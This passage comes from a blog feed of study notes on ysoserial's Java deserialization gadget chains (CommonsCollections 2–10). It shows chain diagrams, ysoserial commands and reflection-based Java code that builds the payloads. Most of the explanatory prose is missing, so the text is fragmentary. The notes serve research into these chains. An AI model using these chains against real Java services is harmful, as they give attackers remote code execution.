PriorityQueue.heapify()</span><br><span class="line">-&gt; PriorityQueue.siftDown()</span><br><span class="line">-&gt; PriorityQueue.siftDownUsingComparator()</span><br><span class="line">-&gt; TransformingComparator.compare()</span><br><span class="line">-&gt; InvokerTransformer.transform()</span><br><span class="line">-&gt; TemplatesImpl.newTransformer()</span><br><span class="line">... templates Gadgets ...</span><br><span class="line">-&gt; Runtime.getRuntime().exec()</span><br><span class="line"></span><br><span class="line">CommonsCollection4:</span><br><span class="line">PriorityQueue.readObject</span><br><span class="line">-&gt; PriorityQueue.heapify()</span><br><span class="line">-&gt; PriorityQueue.siftDown()</span><br><span class="line">-&gt; PriorityQueue.siftDownUsingComparator()</span><br><span class="line">-&gt; TransformingComparator.compare()</span><br><span class="line">-&gt; ChainedTransformer.transform()</span><br><span class="line">-&gt; InstantiateTransformer.transform()</span><br><span class="line">-&gt; TemplatesImpl.newTransformer()</span><br><span class="line">... templates Gadgets ...</span><br><span class="line">-&gt; Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><h2 id="2-CommonsCollections8"><a href="#2-CommonsCollections8" class="headerlink" title="2.CommonsCollections8"></a>2.CommonsCollections8</h2><p>CommonsCollections8<strong><a href="https://github.com/navalorenzo" target="_blank" rel="noopener">navalorenzo</a></strong>ysoserial824readObject<code>TreeBag</code></p><p><code>TreeBag.readObject</code></p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105154637160.png" alt="image-20191105154637160"></p><p><code>TreeBag</code><code>doReadObject</code><code>TreeMap</code>.</p><p><code>doReadObject</code></p><p><img src="study_java_deseriablized_4/image-20191105155805597.png" alt="image-20191105155805597.png"></p><p>TreeMap<code>put</code></p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105155659102.png" alt="image-20191105155659102"></p><p><code>compare</code></p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105155936014.png" alt="image-20191105155936014"></p><p><code>comparator.compare</code><code>comparator</code><code>TransformingComparator</code></p><p>CommonsCollections2</p><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TreeBag.readObject()</span><br><span class="line">-&gt; AbstractMapBag.doReadObject()</span><br><span class="line">-&gt; TreeMap.put()</span><br><span class="line">-&gt; TransformingComparator.compare()</span><br><span class="line">-&gt; InvokerTransformer.transform()</span><br><span class="line">-&gt; TemplatesImpl.newTransformer()</span><br><span class="line">... templates Gadgets ...</span><br><span class="line">-&gt; Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><h2 id="3-commons-collections-4-1"><a href="#3-commons-collections-4-1" class="headerlink" title="3. commons-collections:4.1"></a>3. commons-collections:4.1</h2><p>CommonsCollections2,4,8commons-collections:4.04.1</p><p>InvokerTransformerInstantiateTransformer4.1Serializableemmmmm248</p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105161531047.png" alt="image-20191105161531047"></p><p><img src="/images/study-java-deserialized-commonscollections4-20191105/image-20191105161550587.png" alt="image-20191105161550587"></p><p></p><h1 id="0x03-"><a href="#0x03-" class="headerlink" title="0x03 "></a>0x03 </h1><p>ysoserialcommons-collectionspayloadsJava</p><h2 id="1-"><a href="#1-" class="headerlink" title="1. "></a>1. </h2><p>InvokerTransformertransformdefineClass</p><h2 id="2-"><a href="#2-" class="headerlink" title="2. "></a>2. </h2><p>CommonsCollectionspayloadspayloads</p><p></p><ol><li><code>Serializable</code></li><li><code>TreeMap.map.put()</code><code>ConstantTransformer.transform</code><code>iConstant</code></li><li><code>readObject</code></li><li><code>invoke</code></li><li><code>readObject</code><code>invoke</code><code>TreeBag.readObject</code><code>doReadObject</code></li></ol><p>5</p><p><a href="https://github.com/JackOfMostTrades/gadgetinspector" target="_blank" rel="noopener">https://github.com/JackOfMostTrades/gadgetinspector</a></p><p></p><p>commons-collectionsgadetinspector</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notesJavaCommonsCollections5,6,7,9,10</title>
      <link href="2019/10/31/java/study-java-deserialized-commonscollections3-others/"/>
      <url>2019/10/31/java/study-java-deserialized-commonscollections3-others/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h1><p>CommonsCollectionsCommonsCollections5,6,710.</p><a id="more"></a><h1 id="0x01-"><a href="#0x01-" class="headerlink" title="0x01 "></a>0x01 </h1><hr><p>jdk8commons-collections:3.1</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 <span class="string">"open /System/Applications/Calculator.app"</span> &gt; commonscollections5.ser</span><br><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections6 <span class="string">"open /System/Applications/Calculator.app"</span> &gt; commonscollections6.ser</span><br><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections7 <span class="string">"open /System/Applications/Calculator.app"</span> &gt; commonscollections7.ser</span><br></pre></td></tr></table></figure><h1 id="0x02-"><a href="#0x02-" class="headerlink" title="0x02 "></a>0x02 </h1><hr><h2 id="1-"><a href="#1-" class="headerlink" title="1. "></a>1. </h2><p>CommonsCollections13AnnotationInvocationHandlerOverride.classjdk8payload<code>java.lang.Override missing element entrySet</code></p><p>jdk8<code>AnnotationInvocationHandler</code><a href="http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/diff/8e3338e7c7ea/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java" target="_blank" rel="noopener"></a></p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029103316582.png" alt="image-20191029103316582"></p><p>jdk8<code>s.defaultReadObject</code><code>AnnotaionInvocationHandler</code></p><p>13payload<code>LazyMap.get</code><code>memberValues</code><code>LazyMap</code></p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029103756251.png" alt="image-20191029103756251"></p><p>jdk8<code>memberValues</code><code>LazyMap</code><code>memberValues</code><code>LinkedHashMap</code><code>entrySet</code></p><p>jdk8CommonsCollections13AnnotationInvocationHandlerCommonsCollections567</p><h2 id="2-CommonsCollections5"><a href="#2-CommonsCollections5" class="headerlink" title="2. CommonsCollections5"></a>2. CommonsCollections5</h2><p>CommonsCollections51AnnotationInvocationHandler</p><p>AnnotationInvocationHandlerLazyMap.get</p><ul><li>MapObject</li><li>Map.get</li></ul><p>CommonsCollections5TiedMapEntry</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029110642707.png" alt="image-20191029110642707"></p><p>TiedMapEntrymapgetValuemap.gettoStringhashCodeequalsgetValuetoString</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029110812953.png" alt="image-20191029110812953"></p><p>toString</p><ul><li>Map.EntryObject</li><li>toString</li></ul><p><code>BadAttributeValueExpException</code><code>readObject</code><code>toString</code></p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029111315584.png" alt="image-20191029111315584"></p><p><code>System.getSecurityManager</code>jvm</p><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject()</span><br><span class="line">-&gt; valObj.toString() =&gt; TiedMapEntry.getValue</span><br><span class="line">-&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()</span><br><span class="line">-&gt; factory.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">-&gt; Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><h2 id="3-CommonsCollections6"><a href="#3-CommonsCollections6" class="headerlink" title="3. CommonsCollections6"></a>3. CommonsCollections6</h2><p>CommonsCollections6</p><p>2CommonsCollections5<code>toString</code><code>hashCode</code><code>equals</code>getValue</p><p>CommonsCollections6<code>TiedMapEntry</code><code>hashCode</code><code>LazyMap.get</code></p><p>HashSetkeykeykeyhashCodekeyhashCodeHashCodeHashSetputaddHashSetput</p><p>HashSet<code>readObject</code></p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029145451405.png" alt="image-20191029145451405"></p><p>putHashMapput</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029150815776.png" alt="image-20191029150815776"></p><p>key<code>hash()</code><code>key.hashCode</code>key<code>TiedMapEntry</code>key<code>HashSet.add</code>HashSetHashMapKey</p><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HashSet.readObject()</span><br><span class="line">-&gt; HashMap.put(key) =&gt; key.hashCode =&gt; TiedMapEntry.hashCode</span><br><span class="line">-&gt; TiedMapEntry.getValue</span><br><span class="line">-&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()</span><br><span class="line">-&gt; factory.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">-&gt; Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><h2 id="4-CommonsCollections7"><a href="#4-CommonsCollections7" class="headerlink" title="4. CommonsCollections7"></a>4. CommonsCollections7</h2><p>CommonsCollections7Hashtable<code>AnnotationInvocationHandler</code>CommonsCollections7<code>TiredMapEntry</code>key<code>equals</code><code>Lazy.get</code></p><p><code>Hashtable</code><code>readObject</code></p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029170332420.png" alt="image-20191029170332420"></p><p><code>reconstitutionPut</code></p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029170517723.png" alt="image-20191029170517723"></p><p>table1236if<code>equals</code></p><p><code>equals</code><code>key</code><code>LazyMap</code><code>AbstractMapDecorator</code><code>equals</code></p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029173505843.png" alt="image-20191029173505843"></p><p>mapequalsHashMap<code>AbstractMap</code><code>equals</code></p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191029173654711.png" alt="image-20191029173654711"></p><p>495<code>m.get</code><code>LazyMap.get</code></p><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hashtable.readObject()</span><br><span class="line">-&gt; Hashtable.reconstitutionPut</span><br><span class="line">-&gt; LazyMap.equals =&gt; AbstractMapDecorator.equals =&gt; AbstractMap.equals</span><br><span class="line">-&gt; m.get() =&gt; LazyMap.get()</span><br><span class="line">-&gt; factory.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">-&gt; Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><h2 id="5-"><a href="#5-" class="headerlink" title="5. "></a>5. </h2><p>CommonsCollections67exp</p><hr><h3 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h3><p>CommonsCollections6TiedMapEntryHashSet</p><p>add</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line">HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">map.add(entry);</span><br></pre></td></tr></table></figure><p>ysoserail</p><p></p><ul><li>HashSet</li><li>HashSetmap</li><li>HashMap(map)table(Node&lt;K,V&gt;)</li><li>NodekeykeyTiedMapEntry</li></ul><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">map.add(<span class="string">"foo"</span>);</span><br><span class="line">Field f = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    f = HashSet.class.getDeclaredField("map");//HashSetmap Field</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">    f = HashSet.class.getDeclaredField("backingMap");</span><br><span class="line">&#125;</span><br><span class="line">Permit.setAccessible(f);<span class="comment">// map</span></span><br><span class="line">HashMap innimpl = <span class="keyword">null</span>;</span><br><span class="line">innimpl = (HashMap) f.get(map);<span class="comment">// mapmap</span></span><br><span class="line"></span><br><span class="line">Field f2 = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  f2 = HashMap.class.getDeclaredField("table");// HashMap table field</span><br><span class="line">&#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">  f2 = HashMap.class.getDeclaredField("elementData");</span><br><span class="line">&#125;</span><br><span class="line">Permit.setAccessible(f2);<span class="comment">// HashMapfield </span></span><br><span class="line">Object[] array = <span class="keyword">new</span> Object[<span class="number">0</span>];</span><br><span class="line">array = (Object[]) f2.get(innimpl);</span><br><span class="line">Object node = array[<span class="number">0</span>];<span class="comment">// Node&lt;k,v&gt;</span></span><br><span class="line"><span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">  node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Field keyField = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">  keyField = node.getClass().getDeclaredField(<span class="string">"key"</span>);<span class="comment">// Nodekey field</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">  keyField = Class.forName(<span class="string">"java.util.MapEntry"</span>).getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">&#125;</span><br><span class="line">Permit.setAccessible(keyField);<span class="comment">// Field</span></span><br><span class="line">keyField.set(node, entry);<span class="comment">// nodekeyTiedMapEntry</span></span><br></pre></td></tr></table></figure><p>HashSetTiedMapEntry</p><p>ysoserailReflectionsexp</p><hr><h3 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h3><p>CommonsCollectionskeyhash<code>equals</code><code>LazyMap.get</code></p><p>exphashLazyMap</p><p>String.hashCodehash</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191031172937969.png" alt="image-20191031172937969"></p><p>CommonsCollections7bughash</p><p>LazyMap.get</p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191031181203017.png" alt="image-20191031181203017"></p><p>151<code>map</code><code>key</code></p><p><code>key</code><code>map</code><code>key</code>payloadexp</p><p>ysoserialCommonsCollections7</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">lazyMap1.put(<span class="string">"yy"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">lazyMap2.put(<span class="string">"zZ"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">"iTransformers"</span>, transformers);</span><br><span class="line"><span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">lazyMap2.remove(<span class="string">"yy"</span>);</span><br></pre></td></tr></table></figure><p>putLazyMap2yylazyMap2yyremove</p><h2 id="6-CommonsCollections10"><a href="#6-CommonsCollections10" class="headerlink" title="6. CommonsCollections10"></a>6. CommonsCollections10</h2><p>1,3,5,6,7payloadCommonsCollectionspayloadpayload</p><p>payloadCommonsCollections67CommonsCollections6<code>TiedMapEntry</code><code>hashCode</code></p><p><code>Hashtable</code><code>reconstitutionPut</code></p><p><img src="/images/java-deserialized-commonscollections-others-20191031/image-20191031183753047.png" alt="image-20191031183753047"></p><p>1234<code>key</code><code>hashCode</code>key<code>TiedMapEntry</code><code>LazyMap.get</code></p><p></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Hashtable.readObject()</span><br><span class="line">-&gt; Hashtable.reconstitutionPut</span><br><span class="line">-&gt; key.hashCode() =&gt; TiedMapEntry.hashCode()</span><br><span class="line">-&gt; TiedMapEntry.getValue</span><br><span class="line">-&gt; TiedMapEntry.map.get() =&gt; LazyMap.get()</span><br><span class="line">-&gt; factory.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">-&gt; Runtime.getRuntime().exec()</span><br></pre></td></tr></table></figure><p>CommonsCollections6</p><p>5payloadexp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line">Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">hashtable.put(<span class="string">"foo"</span>,<span class="number">1</span>);</span><br><span class="line"><span class="comment">// hashtabletable</span></span><br><span class="line">Field tableField = Hashtable.class.getDeclaredField("table");</span><br><span class="line">Permit.setAccessible(tableField);</span><br><span class="line">Object[] table = (Object[])tableField.get(hashtable);</span><br><span class="line">Object entry1 = table[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(entry1==<span class="keyword">null</span>)</span><br><span class="line">    entry1 = table[<span class="number">1</span>];</span><br><span class="line"><span class="comment">// Hashtable.Entrykey</span></span><br><span class="line">Field keyField = entry1.getClass().getDeclaredField(<span class="string">"key"</span>);</span><br><span class="line">Permit.setAccessible(keyField);</span><br><span class="line"><span class="comment">// keyTiedMapEntry</span></span><br><span class="line">keyField.set(entry1, entry);</span><br><span class="line"><span class="comment">// </span></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">"iTransformers"</span>, transformers);</span><br><span class="line"><span class="keyword">return</span> hashtable;</span><br></pre></td></tr></table></figure><h2 id="7-CommonsCollections9"><a href="#7-CommonsCollections9" class="headerlink" title="7. CommonsCollections9"></a>7. CommonsCollections9</h2><p>CommonsCollections10</p><ul><li><a href="https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java" target="_blank" rel="noopener">https://github.com/Jayl1n/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections8.java</a></li><li><a href="https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/pull/125/commits/4edf02ba7765488cac124c92e04c6aae40da3e5d</a></li><li><a href="https://github.com/frohoff/ysoserial/pull/116" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/pull/116</a></li></ul><p></p><ol><li><p><a href="https://github.com/Jayl1n" target="_blank" rel="noopener">Jayl1n</a>Runtime.getRuntime().execURLClassLoader.loadClass().newInstanceCommonsCollections6</p></li><li><p><strong><a href="https://github.com/meizjm3i" target="_blank" rel="noopener"></a></strong>CommonsCollections9CommonsCollections:3.2<code>DefaultedMap</code><code>LazyMap</code>Mapget</p></li><li><strong><a href="https://github.com/navalorenzo" target="_blank" rel="noopener">navalorenzo</a></strong>CommonsCollections8CommonsCollections:4.0</li></ol><h1 id="0x03-"><a href="#0x03-" class="headerlink" title="0x03 "></a>0x03 </h1><p><a href="http://blog.0kami.cn/2019/10/24/study-java-deserialized-vulnerability/">CommonsCollections1</a><a href="http://blog.0kami.cn/2019/10/28/study-java-deserialized-commonscollections3/">CommonsCollections3</a>CommonsCollections567910</p><p><a href="https://www.freebuf.com/articles/web/214096.html" target="_blank" rel="noopener"></a>CommonsCollections&lt;=3.2.1</p><hr><ul><li><ol><li><code>AnnotationInvocationHandler</code><code>readObject</code></li><li><code>BadAttributeValueExpException</code><code>readObject</code></li><li><code>HashSet</code><code>readObject</code></li><li><code>Hashtable</code><code>readObject</code></li></ol></li><li><ol><li><code>LazyMap</code><code>get</code></li><li><code>DefaultedMap</code><code>get</code></li><li><code>TiedMapEntry</code><code>getValue</code></li><li><code>Proxy</code><code>invoke</code></li></ol></li><li><ol><li><code>ChainedTransformer</code><code>transform</code></li><li><code>InvokerTransformer</code><code>transform</code></li><li><code>ConstantTransformer</code><code>transform</code></li></ol></li></ul><hr><p>expjdk</p><ol><li>jdk7 =&gt; CommonsCollection13</li><li>jdk7 &amp; jdk8 =&gt; CommonsCollections5,6,7,9,10</li></ol><p>expcommons-collections</p><ol><li>commons-collections&lt;=3.1 CommonsCollections1,3,5,6,7,10</li><li>commons-collections&lt;=3.2.1 CommonsCollections1,3,5,6,7,9,10</li></ol><hr><p>commons-collections:3.xCommonsCollections10</p><p>commons-collections:4</p>]]></content>
      
      
      <categories>
          
          <category> notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vul </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>notesJavaCommonsCollections3</title>
      <link href="2019/10/28/java/study-java-deserialized-commonscollections3-3/"/>
      <url>2019/10/28/java/study-java-deserialized-commonscollections3-3/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-"><a href="#0x00-" class="headerlink" title="0x00 "></a>0x00 </h1><p>ysoserialCommonsCollections1JavaysoserialCommonsCollections3.</p><a id="more"></a><h1 id="0x01-"><a href="#0x01-" class="headerlink" title="0x01 "></a>0x01 </h1><p>overridejdk7u80ysoserialpayload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections3 <span class="string">"open /System/Applications/Calculator.app"</span> &gt; commonscollections3.ser</span><br></pre></td></tr></table></figure><h1 id="0x02-"><a href="#0x02-" class="headerlink" title="0x02 "></a>0x02 </h1><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StaticBlockTest</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Cracker</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] generate()&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String code = <span class="string">"&#123;java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\");&#125;"</span>;</span><br><span class="line">            ClassPool pool = ClassPool.getDefault();</span><br><span class="line">            CtClass clazz = pool.get(StaticBlockTest<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">            clazz.setName(<span class="string">"demo"</span>);</span><br><span class="line">            clazz.makeClassInitializer().insertAfter(code);</span><br><span class="line">            <span class="keyword">return</span> clazz.toBytecode();</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] clazz = generate();</span><br><span class="line">        DefiningClassLoader loader = <span class="keyword">new</span> DefiningClassLoader();</span><br><span class="line">        Class cls = loader.defineClass(<span class="string">"demo"</span>,clazz);<span class="comment">// </span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            cls.newInstance(); <span class="comment">// </span></span><br><span class="line">        &#125; </span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>        a. defineClassbyteClass</p><p>       b. static initializer</p><p>Java<code>defineClass</code></p><p><img src="/images/java-deserialized-commonscollections3-20191028/image-20191025190617899.png" alt="image-20191025190617899"></p><p>JavaClassLoaderbytesClassdefineClass</p><p>byteJava</p><p>Javastatic blockjavassist</p><h1 id="0x03-"><a href="#0x03-" class="headerlink" title="0x03 "></a>0x03 </h1><h2 id="1-"><a href="#1-" class="headerlink" title="1. "></a>1. </h2><p>CommonsCollections3CommonsCollections1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sun.reflect.annotation.AnnotationInvocationHandler.readObject()</span><br><span class="line">-&gt; memberValues.entrySet()</span><br><span class="line">-&gt; AnnotationInvocationHandler.invoke()</span><br><span class="line">-&gt; memberValues.get() =&gt; LazyMap.get()</span><br><span class="line">-&gt; factory.transform() =&gt; ChainedTransformer.transform()</span><br><span class="line">-&gt; iTransformers[].transform()</span><br></pre></td></tr></table></figure><p>CommonsCollections1ChainedTransformer.transform()iTransformerstransformCommonsCollections1InvokerTransformertransformInvokerTransformer</p><h2 id="2-"><a href="#2-" class="headerlink" title="2. "></a>2. </h2><p>CommonsCollections3payloads</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Object templatesImpl = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">      <span class="keyword">new</span> ConstantTransformer(TrAXFilter<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line"><span class="class">      <span class="title">new</span> <span class="title">InstantiateTransformer</span>(</span></span><br><span class="line">            new Class[] &#123; Templates.class &#125;,</span><br><span class="line">            <span class="keyword">new</span> Object[] &#123; templatesImpl &#125; )&#125;;</span><br><span class="line"><span class="comment">//  